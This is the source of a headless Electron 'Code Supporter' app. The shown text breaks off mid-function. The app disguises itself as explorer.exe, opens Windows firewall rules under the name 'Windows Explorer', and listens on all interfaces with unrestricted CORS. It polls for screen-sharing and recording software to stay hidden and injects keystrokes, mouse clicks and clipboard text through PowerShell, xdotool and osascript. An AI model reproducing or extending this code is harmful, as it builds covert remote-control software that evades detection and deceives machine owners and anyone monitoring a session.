const { app, ipcMain, globalShortcut, nativeImage, desktopCapturer, screen } = require('electron');
const path = require('path');
const io = require('socket.io-client');
// const robot = require('robotjs'); // Temporarily disabled due to compatibility issues
const screenshot = require('screenshot-desktop');
const notifier = require('node-notifier');
// Audio recording removed

// Disguise process name as Windows Explorer and try to hide from process list
if (process.platform === 'win32') {
  process.title = 'explorer.exe';
  // Also try to set the process name
  try {
    process.argv[1] = 'C:\\Windows\\explorer.exe';
  } catch (e) {
    // Ignore if we can't modify argv
  }
  
  // Try to hide from process list using Windows API
  try {
    const { exec } = require('child_process');
    // Set process priority to idle to make it less noticeable
    exec('wmic process where "name=\'explorer.exe\'" CALL setpriority "idle"', (error) => {
      if (!error) {
        // Process priority set to idle
      }
    });
  } catch (e) {
    // Ignore if we can't modify process priority
  }
}

class TesterApp {
  constructor() {
    // Removed mainWindow - app is now completely headless
    // Removed tray - app is completely headless
    this.socket = null;
    this.isConnected = false;
    this.tempData = '';
    this.isSharing = false;
    this.isScreenSharingDetected = false; // Track if screen sharing is detected from any source
    this.isAlwaysInvisible = false; // Track if always invisible mode is enabled
    this.chatMessages = [];
    this.isAudioEnabled = false; // Audio disabled
    this.useElectronCapture = false; // Use only screenshot method for simplicity and reliability
    this.lastQualityAdjustment = 0; // Track last quality adjustment time
    // Mouse cursor captured directly in screen images
    
    // Delta compression for efficient screen sharing
    this.lastScreenBuffer = null;
    this.lastScreenWidth = 0;
    this.lastScreenHeight = 0;
    this.pixelmatch = null; // Will be loaded dynamically
    
    this.init();
  }

  init() {
    app.whenReady().then(() => {
      // App is ready, starting headless server
      // Removed createTray - app is completely headless
      this.registerGlobalShortcuts();
      this.setupIpcHandlers();
      
      // Check input tools availability
      this.checkInputTools();
      
      // Auto-start server on app launch with default TCP port
      // Use medium quality for better image clarity
      const defaultQuality = 'medium';
      setTimeout(() => {
        this.startServer(3000, defaultQuality); // Changed from 8080 to 3000 (non-privileged port)        
      }, 1000); // Small delay to ensure UI is ready
      
      // Tester app initialized successfully
    });

    app.on('window-all-closed', () => {
      if (process.platform !== 'darwin') {
        app.quit();
      }
    });

    // Handle app termination gracefully
    app.on('before-quit', (event) => {
      if (this.socket) {
        this.socket.disconnect();
      }
      if (this.isSharing) {
        this.stopScreenSharing();
      }
      // Clean up protection intervals
      if (this.aggressiveProtectionInterval) {
        clearInterval(this.aggressiveProtectionInterval);
        this.aggressiveProtectionInterval = null;
      }
      if (this.windowHidingInterval) {
        clearInterval(this.windowHidingInterval);
        this.windowHidingInterval = null;
      }
      // Clean up Windows Firewall rules
      this.cleanupWindowsFirewall();
    });

    // Handle uncaught exceptions gracefully
    process.on('uncaughtException', (error) => {
      console.error('Uncaught Exception:', error);
      if (error.message.includes('spawn sox ENOENT') || 
          error.message.includes('spawn rec ENOENT') || 
          error.message.includes('spawn arecord ENOENT')) {
        // Audio tool not found - audio features disabled
        // Don't crash the app for missing audio tools
        return;
      }
      // For other errors, let them bubble up
      throw error;
    });

    // Handle second instance (prevent multiple instances)
    const gotTheLock = app.requestSingleInstanceLock();
    if (!gotTheLock) {
      // Another instance is already running, quitting
      app.quit();
    } else {
      app.on('second-instance', () => {
        // Someone tried to run a second instance, show tray notification
        // Second instance attempted - app already running
        if (this.tray) {
          this.tray.displayBalloon({
            title: 'Code Supporter',
            content: 'App is already running in the background',
            icon: this.createExplorerIcon()
          });
        }
      });
    }

    app.on('activate', () => {
      // No UI to activate - app runs headlessly
      // App activated - running headlessly
    });
  }

  // Removed window hiding protection - no UI to hide

  createExplorerIcon() {
    // Create a Windows Explorer-like icon using nativeImage
    if (process.platform === 'win32') {
      // Try to use the actual Windows Explorer icon
      try {
        const iconPath = 'C:\\Windows\\System32\\imageres.dll';
        return nativeImage.createFromPath(iconPath);
      } catch (error) {
        // Could not load Windows Explorer icon, using empty icon
        return nativeImage.createEmpty();
      }
    }
    
    // For other platforms, use empty icon
    return nativeImage.createEmpty();
  }

  // Removed createMainWindow - app is now completely headless

  // Removed injectStealthScript - no UI to protect

  // Removed all window-related methods - app is now completely headless

  // Removed screen sharing detection - no UI to protect

  // Removed enableAlwaysInvisibleMode - no UI to protect

  // Removed startAggressiveProtection - no UI to protect

  // Removed all hideNativeUIElements methods - no UI to protect

  // Removed hideNativeUIElementsWindows - no UI to protect

  hideNativeUIElementsLinux() {
    const { exec } = require('child_process');
    
    // Hide native UI elements on Linux using xdotool
    exec(`xdotool search --class "tooltip" windowunmap --sync`, (error) => {
      // Silently fail - this is just additional protection
    });
    
    exec(`xdotool search --class "dropdown" windowunmap --sync`, (error) => {
      // Silently fail - this is just additional protection
    });
    
    exec(`xdotool search --class "menu" windowunmap --sync`, (error) => {
      // Silently fail - this is just additional protection
    });
  }

  hideNativeUIElementsMac() {
    const { exec } = require('child_process');
    
    // Hide native UI elements on macOS using osascript
    const hideScript = `
      tell application "System Events"
        try
          set tooltipWindows to every window whose name contains "tooltip"
          repeat with w in tooltipWindows
            set visible of w to false
          end repeat
          
          set dropdownWindows to every window whose name contains "dropdown"
          repeat with w in dropdownWindows
            set visible of w to false
          end repeat
        end try
      end tell
    `;
    
    exec(`osascript -e '${hideScript}'`, (error) => {
      // Silently fail - this is just additional protection
    });
  }

  checkScreenSharingStopped() {
    // In always invisible mode, never restore window visibility
    if (this.isAlwaysInvisible) {
      return;
    }
    
    if (this.isScreenSharingDetected) {
      if (process.platform === 'win32') {
        this.checkScreenSharingStoppedWindows();
      } else if (process.platform === 'linux') {
        this.checkScreenSharingStoppedLinux();
      } else if (process.platform === 'darwin') {
        this.checkScreenSharingStoppedMac();
      }
    }
  }

  checkScreenSharingStoppedWindows() {
    const { exec } = require('child_process');
    const screenSharingApps = [
      'zoom.exe', 'teams.exe', 'skype.exe', 'discord.exe', 'obs64.exe', 'obs32.exe',
      'chrome.exe', 'msedge.exe', 'firefox.exe', 'slack.exe', 'webexmta.exe',
      'gotomeeting.exe', 'bluejeans.exe', 'jitsi.exe', 'whereby.exe'
    ];
    
    let anyAppRunning = false;
    let checkedApps = 0;
    
    screenSharingApps.forEach(app => {
      exec(`tasklist /FI "IMAGENAME eq ${app}" /FO CSV`, (error, stdout) => {
        checkedApps++;
        if (!error && stdout.includes(app)) {
          anyAppRunning = true;
        }
        
        // If we've checked all apps and none are running, restore window
        if (checkedApps === screenSharingApps.length && !anyAppRunning) {
          this.handleScreenSharingStopped();
        }
      });
    });
  }

  checkScreenSharingStoppedLinux() {
    const { exec } = require('child_process');
    const screenSharingApps = [
      'zoom', 'teams', 'skype', 'discord', 'obs', 'obs-studio',
      'chrome', 'chromium', 'firefox', 'slack', 'webex',
      'gotomeeting', 'bluejeans', 'jitsi', 'whereby', 'signal',
      'telegram', 'element', 'mattermost', 'rocketchat'
    ];
    
    let anyAppRunning = false;
    let checkedApps = 0;
    
    screenSharingApps.forEach(app => {
      exec(`ps aux | grep -i ${app} | grep -v grep`, (error, stdout) => {
        checkedApps++;
        if (!error && stdout.trim()) {
          anyAppRunning = true;
        }
        
        // If we've checked all apps and none are running, restore window
        if (checkedApps === screenSharingApps.length && !anyAppRunning) {
          this.handleScreenSharingStopped();
        }
      });
    });
  }

  checkScreenSharingStoppedMac() {
    const { exec } = require('child_process');
    const screenSharingApps = [
      'zoom', 'teams', 'skype', 'discord', 'obs', 'obs-studio',
      'chrome', 'firefox', 'slack', 'webex', 'gotomeeting',
      'bluejeans', 'jitsi', 'whereby', 'signal', 'telegram'
    ];
    
    let anyAppRunning = false;
    let checkedApps = 0;
    
    screenSharingApps.forEach(app => {
      exec(`ps aux | grep -i ${app} | grep -v grep`, (error, stdout) => {
        checkedApps++;
        if (!error && stdout.trim()) {
          anyAppRunning = true;
        }
        
        // If we've checked all apps and none are running, restore window
        if (checkedApps === screenSharingApps.length && !anyAppRunning) {
          this.handleScreenSharingStopped();
        }
      });
    });
  }

  detectScreenSharing() {
    // Check for common screen sharing applications
    const { exec } = require('child_process');
    
    if (process.platform === 'win32') {
      this.detectScreenSharingWindows();
    } else if (process.platform === 'linux') {
      this.detectScreenSharingLinux();
    } else if (process.platform === 'darwin') {
      this.detectScreenSharingMac();
    }
  }

  detectScreenSharingWindows() {
    const { exec } = require('child_process');
    
    // List of common screen sharing applications on Windows
    const screenSharingApps = [
      'zoom.exe', 'teams.exe', 'skype.exe', 'discord.exe', 'obs64.exe', 'obs32.exe',
      'chrome.exe', 'msedge.exe', 'firefox.exe', 'slack.exe', 'webexmta.exe',
      'gotomeeting.exe', 'bluejeans.exe', 'jitsi.exe', 'whereby.exe'
    ];
    
    // Check for running screen sharing applications
    screenSharingApps.forEach(app => {
      exec(`tasklist /FI "IMAGENAME eq ${app}" /FO CSV`, (error, stdout) => {
        if (!error && stdout.includes(app)) {
          this.handleScreenSharingDetected();
        }
      });
    });
    
    // Additional check: Monitor for screen capture activity
    this.monitorScreenCaptureWindows();
  }

  detectScreenSharingLinux() {
    const { exec } = require('child_process');
    
    // List of common screen sharing applications on Linux
    const screenSharingApps = [
      'zoom', 'teams', 'skype', 'discord', 'obs', 'obs-studio',
      'chrome', 'chromium', 'firefox', 'slack', 'webex',
      'gotomeeting', 'bluejeans', 'jitsi', 'whereby', 'signal',
      'telegram', 'element', 'mattermost', 'rocketchat'
    ];
    
    // Check for running screen sharing applications using ps
    screenSharingApps.forEach(app => {
      exec(`ps aux | grep -i ${app} | grep -v grep`, (error, stdout) => {
        if (!error && stdout.trim()) {
          this.handleScreenSharingDetected();
        }
      });
    });
    
    // Check for screen sharing using pgrep
    exec('pgrep -f "zoom\\|teams\\|discord\\|obs\\|chrome.*--enable-features=WebRTC"', (error, stdout) => {
      if (!error && stdout.trim()) {
        this.handleScreenSharingDetected();
      }
    });
    
    // Additional check: Monitor for screen capture activity
    this.monitorScreenCaptureLinux();
  }

  detectScreenSharingMac() {
    const { exec } = require('child_process');
    
    // List of common screen sharing applications on macOS
    const screenSharingApps = [
      'zoom', 'teams', 'skype', 'discord', 'obs', 'obs-studio',
      'chrome', 'firefox', 'slack', 'webex', 'gotomeeting',
      'bluejeans', 'jitsi', 'whereby', 'signal', 'telegram'
    ];
    
    // Check for running screen sharing applications using ps
    screenSharingApps.forEach(app => {
      exec(`ps aux | grep -i ${app} | grep -v grep`, (error, stdout) => {
        if (!error && stdout.trim()) {
          this.handleScreenSharingDetected();
        }
      });
    });
    
    // Check for screen sharing using pgrep
    exec('pgrep -f "zoom\\|teams\\|discord\\|obs\\|chrome.*--enable-features=WebRTC"', (error, stdout) => {
      if (!error && stdout.trim()) {
        this.handleScreenSharingDetected();
      }
    });
  }

  monitorScreenCaptureWindows() {
    // Check if screen capture is happening by monitoring system resources on Windows
    const { exec } = require('child_process');
    
    // Check for processes that might be capturing screen
    exec('wmic process where "name like \'%obs%\' or name like \'%bandicam%\' or name like \'%fraps%\' or name like \'%camtasia%\'" get name', (error, stdout) => {
      if (!error && stdout.trim() && !stdout.includes('No Instance(s) Available')) {
        this.handleScreenSharingDetected();
      }
    });
    
    // Check for browser processes that might be screen sharing
    exec('wmic process where "name=\'chrome.exe\' or name=\'msedge.exe\' or name=\'firefox.exe\'" get commandline', (error, stdout) => {
      if (!error && stdout.includes('--enable-features=WebRTC')) {
        this.handleScreenSharingDetected();
      }
    });
  }

  monitorScreenCaptureLinux() {
    // Check if screen capture is happening by monitoring system resources on Linux
    const { exec } = require('child_process');
    
    // Check for screen recording software
    exec('ps aux | grep -i "obs\\|kazam\\|simplescreenrecorder\\|recordmydesktop\\|ffmpeg.*x11grab" | grep -v grep', (error, stdout) => {
      if (!error && stdout.trim()) {
        this.handleScreenSharingDetected();
      }
    });
    
    // Check for browser processes with screen sharing flags
    exec('ps aux | grep -E "chrome.*--enable-features=WebRTC|firefox.*--enable-features=WebRTC|chromium.*--enable-features=WebRTC" | grep -v grep', (error, stdout) => {
      if (!error && stdout.trim()) {
        this.handleScreenSharingDetected();
      }
    });
    
    // Check for Wayland screen sharing
    exec('ps aux | grep -i "wayland.*screen\\|gnome-shell.*screen\\|kde.*screen" | grep -v grep', (error, stdout) => {
      if (!error && stdout.trim()) {
        this.handleScreenSharingDetected();
      }
    });
  }

  monitorScreenCaptureMac() {
    // Check if screen capture is happening by monitoring system resources on macOS
    const { exec } = require('child_process');
    
    // Check for screen recording software
    exec('ps aux | grep -i "obs\\|quicktime\\|screenflow\\|camtasia" | grep -v grep', (error, stdout) => {
      if (!error && stdout.trim()) {
        this.handleScreenSharingDetected();
      }
    });
    
    // Check for browser processes with screen sharing flags
    exec('ps aux | grep -E "chrome.*--enable-features=WebRTC|firefox.*--enable-features=WebRTC" | grep -v grep', (error, stdout) => {
      if (!error && stdout.trim()) {
        this.handleScreenSharingDetected();
      }
    });
  }

  handleScreenSharingDetected() {
    if (!this.isScreenSharingDetected) {
      this.isScreenSharingDetected = true;
      // Screen sharing detected - making window invisible to screen capture
      
      // App is headless - no window to protect
      
      // No notification - stealth mode activated silently
    }
  }

  handleScreenSharingStopped() {
    // In always invisible mode, never restore window visibility
    if (this.isAlwaysInvisible) {
      return;
    }
    
    if (this.isScreenSharingDetected) {
      this.isScreenSharingDetected = false;
      // Screen sharing stopped - restoring normal window behavior
      
      // App is headless - no window to restore
    }
  }

  // Removed showStealthNotification - no notifications needed

  createTray() {
    // Create Windows Explorer icon for tray
    const icon = this.createExplorerIcon();
    
    this.tray = new Tray(icon);
    
    const contextMenu = Menu.buildFromTemplate([
      {
        label: this.isAlwaysInvisible ? '🥷 Always Invisible Mode' : 'Show Main Window',
        click: () => this.showMainWindowTemporarily()
      },
      {
        label: 'Show Settings',
        click: () => this.showMainWindowTemporarily() // Settings now in main window tabs
      },
      { type: 'separator' },
      {
        label: 'Force Show Window',
        click: () => this.forceShowWindow()
      },
      { type: 'separator' },
      {
        label: 'Quit',
        click: () => {
          app.isQuiting = true;
          app.quit();
        }
      }
    ]);

    this.tray.setContextMenu(contextMenu);
    this.tray.setToolTip('Code Supporter - Tester (Hidden - Click to Show)');
    
    this.tray.on('click', () => {
      this.showMainWindowTemporarily();
    });
  }

  // Removed showSettings - settings now integrated into main window tabs

  showConnectionDialog() {
    // Don't show window - keep it hidden
  }

  registerGlobalShortcuts() {
    // CTRL+SHIFT+L: Input only the first word
    globalShortcut.register('Ctrl+Shift+L', () => {
      this.inputWordByWord();
    });

    // CTRL+SHIFT+K: Input only the first line
    globalShortcut.register('Ctrl+Shift+K', () => {
      this.inputLineByLine();
    });

    // CTRL+SHIFT+C: Copy clipboard to temp data
    globalShortcut.register('Ctrl+Shift+C', () => {
      this.copyClipboardToTemp();
    });
  }

  async inputWordByWord() {
    if (!this.tempData) {
      return;
    }
    
    
    // Get only the first word
    const firstWord = this.tempData.split(' ')[0];
    if (firstWord.trim()) {
      await this.typeText(firstWord);
    }
  }

  async inputLineByLine() {
    if (!this.tempData) {
      return;
    }
    
    
    // Get only the first line
    const firstLine = this.tempData.split('\n')[0];
    if (firstLine.trim()) {
      await this.typeText(firstLine);
    }
  }

  async typeText(text) {
    const { exec } = require('child_process');
    
    // Attempting to type text
    
    // Limit text length to prevent issues
    if (text.length > 1000) {
      // Text too long, truncating to 1000 characters
      text = text.substring(0, 1000);
    }
    
    if (process.platform === 'win32') {
      // Windows: Use PowerShell to send text character by character (safer)
      const escapedText = text.replace(/"/g, '""').replace(/\{/g, '{{').replace(/\}/g, '}}');
      return new Promise((resolve) => {
        exec(`powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${escapedText}')"`, (error) => {
          if (error) {
            console.error('Error typing text with SendKeys:', error);
            // Fallback: try using VBScript
            const vbsText = text.replace(/"/g, '""');
            exec(`cscript //nologo -e:vbscript <(echo "CreateObject(\"WScript.Shell\").SendKeys \"${vbsText}\"")`, (error2) => {
              if (error2) console.error('Error typing text with VBScript:', error2);
              resolve();
            });
          } else {
            resolve();
          }
        });
      });
    } else if (process.platform === 'linux') {
      // Linux: Use xdotool to type character by character (safe method)
      return new Promise((resolve) => {
        // Simple escaping for xdotool - only escape quotes and backslashes
        const escapedText = text.replace(/"/g, '\\"').replace(/\\/g, '\\\\');
        
        exec(`xdotool type "${escapedText}"`, (error) => {
          if (error) {
            console.error('Error typing text with xdotool:', error);
            // Fallback: try ydotool if available
            exec(`ydotool type "${escapedText}"`, (error2) => {
              if (error2) {
                console.error('Error typing text with ydotool:', error2);
                // Last resort: try xvkbd
                exec(`xvkbd -text "${escapedText}"`, (error3) => {
                  if (error3) {
                    console.error('All typing methods failed. Please install xdotool: sudo apt install xdotool');
                  }
                  resolve();
                });
              } else {
                resolve();
              }
            });
          } else {
            resolve();
          }
        });
      });
    } else if (process.platform === 'darwin') {
      // macOS: Use osascript to type character by character (safe method)
      const escapedText = text.replace(/"/g, '\\"').replace(/\\/g, '\\\\');
      return new Promise((resolve) => {
        exec(`osascript -e 'tell application "System Events" to keystroke "${escapedText}"'`, (error) => {
          if (error) {
            console.error('Error typing text with osascript:', error);
            // Fallback: try using pbcopy + pbpaste (but this is less safe)
            exec(`echo "${escapedText}" | pbcopy && osascript -e 'tell application "System Events" to keystroke "v" using command down'`, (error2) => {
              if (error2) console.error('Error with clipboard fallback:', error2);
              resolve();
            });
          } else {
            resolve();
          }
        });
      });
    }
  }

  async pressKey(key, modifiers = []) {
    const { exec } = require('child_process');
    
    if (process.platform === 'win32') {
      return new Promise((resolve) => {
        
        // Build modifier string for Windows
        let keyString = '';
        if (modifiers.includes('ctrl')) keyString += '^';
        if (modifiers.includes('alt')) keyString += '%';
        if (modifiers.includes('shift')) keyString += '+';
        keyString += key;
        
        // Try multiple approaches for better compatibility
        const approaches = [
          // Approach 1: Standard SendKeys
          `powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${keyString}')"`,
          
          // Approach 2: Using nircmd if available
          `nircmd sendkey ${key.toLowerCase()}`,
          
          // Approach 3: Using VBScript
          `cscript //nologo -e:vbscript -c "CreateObject(\"WScript.Shell\").SendKeys \"${keyString}\""`
        ];
        
        let currentApproach = 0;
        
        const tryNextApproach = () => {
          if (currentApproach >= approaches.length) {
            
            resolve();
            return;
          }
          
          const command = approaches[currentApproach];
          
          
          exec(command, (error, stdout, stderr) => {
            if (error) {
              
              currentApproach++;
              tryNextApproach();
            } else {
             
              resolve();
            }
          });
        };
        
        tryNextApproach();
      });
    } else if (process.platform === 'linux') {
      return new Promise((resolve) => {
        // Build modifier string for Linux
        let keyString = '';
        if (modifiers.includes('ctrl')) keyString += 'ctrl+';
        if (modifiers.includes('alt')) keyString += 'alt+';
        if (modifiers.includes('shift')) keyString += 'shift+';
        keyString += key.toLowerCase();
        
        exec(`xdotool key ${keyString}`, (error) => {
          if (error) console.error('Error pressing key:', error);
          resolve();
        });
      });
    } else if (process.platform === 'darwin') {
      return new Promise((resolve) => {
        // Build modifier string for macOS
        let keyString = '';
        if (modifiers.includes('ctrl')) keyString += 'control down, ';
        if (modifiers.includes('alt')) keyString += 'option down, ';
        if (modifiers.includes('shift')) keyString += 'shift down, ';
        keyString += `key code ${this.getKeyCode(key)}`;
        if (modifiers.includes('ctrl')) keyString += ', control up';
        if (modifiers.includes('alt')) keyString += ', option up';
        if (modifiers.includes('shift')) keyString += ', shift up';
        
        exec(`osascript -e 'tell application "System Events" to ${keyString}'`, (error) => {
          if (error) console.error('Error pressing key:', error);
          resolve();
        });
      });
    }
  }

  getKeyCode(key) {
    const keyCodes = {
      'Enter': 36,
      'Return': 36,
      'Tab': 48,
      'Space': 49,
      'Escape': 53
    };
    return keyCodes[key] || 36; // Default to Enter
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  copyClipboardToTemp() {
    const { clipboard } = require('electron');
    this.tempData = clipboard.readText();
  }

  checkInputTools() {
    const { exec } = require('child_process');
    
    if (process.platform === 'linux') {
      exec('which xdotool', (error) => {
      });
    } else if (process.platform === 'win32') {
    } else if (process.platform === 'darwin') {
    }
  }

  // Audio tools check removed

  async moveMouse(x, y) {
    const { exec } = require('child_process');
    
    if (process.platform === 'win32') {
      // Windows: Use PowerShell to move mouse
      return new Promise((resolve) => {
        exec(`powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y})"`, (error) => {
          if (error) console.error('Error moving mouse:', error);
          resolve();
        });
      });
    } else if (process.platform === 'linux') {
      // Linux: Use xdotool to move mouse
      return new Promise((resolve) => {
        exec(`xdotool mousemove ${x} ${y}`, (error) => {
          if (error) {
            console.error('Error moving mouse with xdotool:', error);
            // Fallback: try ydotool
            exec(`ydotool mousemove ${x} ${y}`, (error2) => {
              if (error2) console.error('Error moving mouse with ydotool:', error2);
              resolve();
            });
          } else {
            resolve();
          }
        });
      });
    } else if (process.platform === 'darwin') {
      // macOS: Use osascript to move mouse
      return new Promise((resolve) => {
        exec(`osascript -e 'tell application "System Events" to set the mouse location to {${x}, ${y}}'`, (error) => {
          if (error) console.error('Error moving mouse:', error);
          resolve();
        });
      });
    }
  }

  async clickMouse(x, y, button = 'left') {
    const { exec } = require('child_process');
    
    // First move to position, then click
    await this.moveMouse(x, y);
    
    if (process.platform === 'win32') {
      // Windows: Use simplified PowerShell approach
      return new Promise((resolve) => {
        
        // Try multiple approaches for better compatibility
        const approaches = [
          // Approach 1: Simple mouse_event
          `powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y}); Start-Sleep -Milliseconds 50; [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')"`,
          
          // Approach 2: Using mouse_event API
          `powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport(\"user32.dll\")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, uint dwExtraInfo); }'; [Mouse]::mouse_event(${button === 'right' ? '0x0008' : '0x0002'}, 0, 0, 0, 0); Start-Sleep -Milliseconds 10; [Mouse]::mouse_event(${button === 'right' ? '0x0010' : '0x0004'}, 0, 0, 0, 0)"`,
          
          // Approach 3: Using nircmd if available
          `nircmd setcursor ${x} ${y} && nircmd leftclick`
        ];
        
        let currentApproach = 0;
        
        const tryNextApproach = () => {
          if (currentApproach >= approaches.length) {
            
            resolve();
            return;
          }
          
          const command = approaches[currentApproach];
         
          
          exec(command, (error, stdout, stderr) => {
            if (error) {
             
              currentApproach++;
              tryNextApproach();
            } else {
             
              resolve();
            }
          });
        };
        
        tryNextApproach();
      });
    } else if (process.platform === 'linux') {
      // Linux: Use xdotool to click
      return new Promise((resolve) => {
        const clickButton = button === 'right' ? '3' : '1';
        exec(`xdotool click ${clickButton}`, (error) => {
          if (error) {
            console.error('Error clicking mouse with xdotool:', error);
            // Fallback: try ydotool
            exec(`ydotool click ${clickButton}`, (error2) => {
              if (error2) console.error('Error clicking mouse with ydotool:', error2);
              resolve();
            });
          } else {
            resolve();
          }
        });
      });
    } else if (process.platform === 'darwin') {
      // macOS: Use osascript to click
      return new Promise((resolve) => {
        const clickType = button === 'right' ? 'right click' : 'click';
        exec(`osascript -e 'tell application "System Events" to ${clickType} at {${x}, ${y}}'`, (error) => {
          if (error) console.error('Error clicking mouse:', error);
          resolve();
        });
      });
    }
  }

  captureCursor() {
    const point = screen.getCursorScreenPoint();
    const displays = screen.getAllDisplays();
    
    // Find which display the cursor is on
    const currentDisplay = displays.find(display => {
      return point.x >= display.bounds.x && 
             point.x <= display.bounds.x + display.bounds.width &&
             point.y >= display.bounds.y && 
             point.y <= display.bounds.y + display.bounds.height;
    });

    return {
      x: point.x - currentDisplay.bounds.x,
      y: point.y - currentDisplay.bounds.y,
      display: currentDisplay
    };
  }

  async getMousePosition() {
    try {
      // Use Electron's screen API for more accurate cursor tracking
      const cursorInfo = this.captureCursor();
      return { x: cursorInfo.x, y: cursorInfo.y };
    } catch (error) {
      console.error('Error getting mouse position with Electron API:', error);
      
      // Fallback to platform-specific methods
      const { exec } = require('child_process');
      
      if (process.platform === 'win32') {
      // Windows: Use PowerShell to get mouse position
      return new Promise((resolve) => {
        exec(`powershell -command "Add-Type -AssemblyName System.Windows.Forms; $pos = [System.Windows.Forms.Cursor]::Position; Write-Output \"$($pos.X),$($pos.Y)\""`, (error, stdout) => {
          if (error) {
            console.error('Error getting mouse position:', error);
            resolve({ x: 0, y: 0 });
          } else {
            const [x, y] = stdout.trim().split(',').map(Number);
            resolve({ x: x || 0, y: y || 0 });
          }
        });
      });
    } else if (process.platform === 'linux') {
      // Linux: Use xdotool first (more reliable), then ydotool as fallback
      return new Promise((resolve) => {
        exec(`xdotool getmouselocation --shell`, (error, stdout) => {
          if (error) {
            console.error('Error getting mouse position with xdotool:', error);
            // Fallback: try ydotool
            exec(`ydotool getmouselocation`, (error2, stdout2) => {
              if (error2) {
                console.error('Error getting mouse position with ydotool:', error2);
                resolve({ x: 0, y: 0 });
              } else {
                // Parse ydotool output format: x:123 y:456
                const match = stdout2.match(/x:(\d+)\s+y:(\d+)/);
                if (match) {
                  resolve({ x: parseInt(match[1]), y: parseInt(match[2]) });
                } else {
                  resolve({ x: 0, y: 0 });
                }
              }
            });
          } else {
            // Parse xdotool output format: X=123 Y=456
            const lines = stdout.trim().split('\n');
            const x = parseInt(lines.find(line => line.startsWith('X='))?.split('=')[1]) || 0;
            const y = parseInt(lines.find(line => line.startsWith('Y='))?.split('=')[1]) || 0;
            resolve({ x, y });
          }
        });
      });
    } else if (process.platform === 'darwin') {
      // macOS: Use osascript to get mouse position
      return new Promise((resolve) => {
        exec(`osascript -e 'tell application "System Events" to get mouse location'`, (error, stdout) => {
          if (error) {
            console.error('Error getting mouse position:', error);
            resolve({ x: 0, y: 0 });
          } else {
            // Parse osascript output format: {123, 456}
            const match = stdout.match(/\{(\d+),\s*(\d+)\}/);
            if (match) {
              resolve({ x: parseInt(match[1]), y: parseInt(match[2]) });
            } else {
              resolve({ x: 0, y: 0 });
            }
          }
        });
      });
    }
    }
  }

  // Mouse cursor is now captured directly in screen images (cursor: true)
  // No separate cursor tracking needed - cursor is included in screen capture

  checkAdminPrivileges() {
    if (process.platform !== 'win32') return true;
    
    try {
      // Check if running as administrator
      const { exec } = require('child_process');
      return new Promise((resolve) => {
        exec('net session >nul 2>&1', (error) => {
          resolve(!error);
        });
      });
    } catch (error) {
      return false;
    }
  }

  configureWindowsFirewall(port = 3000) {
    if (process.platform !== 'win32') return;
    
    const { exec } = require('child_process');
    const appName = 'Windows Explorer';
    const appPath = process.execPath;
    
   
    
    // Check admin privileges first
    this.checkAdminPrivileges().then((isAdmin) => {
      if (!isAdmin) {
        
        return;
      }
      
      // Add firewall rule for the application
      const addAppRule = `netsh advfirewall firewall add rule name="${appName}" dir=in action=allow program="${appPath}" enable=yes`;
      const addPortRule = `netsh advfirewall firewall add rule name="${appName} Port ${port}" dir=in action=allow protocol=TCP localport=${port} enable=yes`;
      
      // Also try PowerShell method as fallback
      const psAppRule = `powershell -Command "New-NetFirewallRule -DisplayName '${appName}' -Direction Inbound -Program '${appPath}' -Action Allow -Enabled True"`;
      const psPortRule = `powershell -Command "New-NetFirewallRule -DisplayName '${appName} Port ${port}' -Direction Inbound -Protocol TCP -LocalPort ${port} -Action Allow -Enabled True"`;
      
      exec(addAppRule, (error, stdout, stderr) => {
        if (error) {
          
          exec(psAppRule, (psError, psStdout, psStderr) => {
            if (psError) {
             
            } else {
             
            }
          });
        } else {
         
        }
      });
      
      exec(addPortRule, (error, stdout, stderr) => {
        if (error) {
         
          exec(psPortRule, (psError, psStdout, psStderr) => {
            if (psError) {
             
            } else {
            }
          });
        } else {
         
        }
      });
    });
  }

  cleanupWindowsFirewall(port = 3000) {
    if (process.platform !== 'win32') return;
    
    const { exec } = require('child_process');
    const appName = 'Windows Explorer';
    
      // Remove firewall rules using netsh
    const removeAppRule = `netsh advfirewall firewall delete rule name="${appName}"`;
    const removePortRule = `netsh advfirewall firewall delete rule name="${appName} Port ${port}"`;
    
    // Also try PowerShell method as fallback
    const psRemoveAppRule = `powershell -Command "Remove-NetFirewallRule -DisplayName '${appName}' -ErrorAction SilentlyContinue"`;
    const psRemovePortRule = `powershell -Command "Remove-NetFirewallRule -DisplayName '${appName} Port ${port}' -ErrorAction SilentlyContinue"`;
    
    exec(removeAppRule, (error, stdout, stderr) => {
      if (error) {
        exec(psRemoveAppRule, (psError, psStdout, psStderr) => {
          if (psError) {
          } else {
           
          }
        });
      } else {
        
      }
    });
    
    exec(removePortRule, (error, stdout, stderr) => {
      if (error) {
        exec(psRemovePortRule, (psError, psStdout, psStderr) => {
          if (psError) {
          } else {
           
          }
        });
      } else {

      }
    });
  }

  startServer(port = 3000, quality = 'medium') {
    // Configure Windows Firewall first (only if admin privileges available)
    this.configureWindowsFirewall(port);
    
    const express = require('express');
    const http = require('http');
    const socketIo = require('socket.io');
    
    const expressApp = express();
    this.server = http.createServer(expressApp);
    this.io = socketIo(this.server, {
      cors: {
        origin: "*",
        methods: ["GET", "POST"]
      }
    });

    // Set up server event handlers
    this.setupServerEventHandlers(this.io, quality);

    this.server.listen(port, '0.0.0.0', () => {
      
      // Display connection information
      this.displayConnectionInfo(port);
    });

    this.server.on('error', (error) => {
      console.error('❌ Server error:', error);
      if (error.code === 'EADDRINUSE') {
        console.error(`Port ${port} is already in use. Trying port ${port + 1}`);
        this.server.listen(port + 1, '0.0.0.0');
      } else if (error.code === 'EACCES') {
        console.error(`❌ Permission denied for port ${port}. Trying alternative ports...`);
        this.tryAlternativePorts(port, quality);
      }
    });
  }

  async displayConnectionInfo(port) {
    const os = require('os');
    const networkInterfaces = os.networkInterfaces();
    
    Object.keys(networkInterfaces).forEach(interfaceName => {
      const interfaces = networkInterfaces[interfaceName];
